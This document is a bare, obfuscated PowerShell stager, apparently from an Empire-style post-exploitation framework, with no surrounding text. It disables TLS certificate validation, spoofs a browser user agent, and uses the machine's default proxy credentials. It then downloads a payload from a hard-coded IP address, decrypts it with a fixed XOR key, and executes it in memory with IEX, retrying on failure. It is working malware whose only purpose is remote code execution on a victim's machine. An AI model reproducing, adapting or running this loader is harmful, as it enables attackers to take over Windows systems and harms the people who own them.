
$Wc=NeW-OBJECT SySTEm.Net.WEbCLIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEADERS.ADd('User-Agent',$u);$Wc.Proxy = [SyStEM.Net.WeBREqUest]::DEfAULtWEbPRoxy;$WC.PRoxY.CReDeNtiAlS = [SySteM.Net.CrEdEnTIalCacHe]::DeFaUlTNETworkCRedEntiaLS;$K='a5c6a4705d864f7ed52d2d0f71fe0b73';$R=10;do{Try{$I=0;[CHAR[]]$B=([CHAR[]]($WC.DOWNLOadSTRiNG("https://107.170.132.24:443/index.asp")))|%{$_-BXOr$k[$I++%$K.LenGTH]};IEX ($B-joiN''); $R=0;}CAtch{sLeep 5;$R--}} While ($R -GT 0)

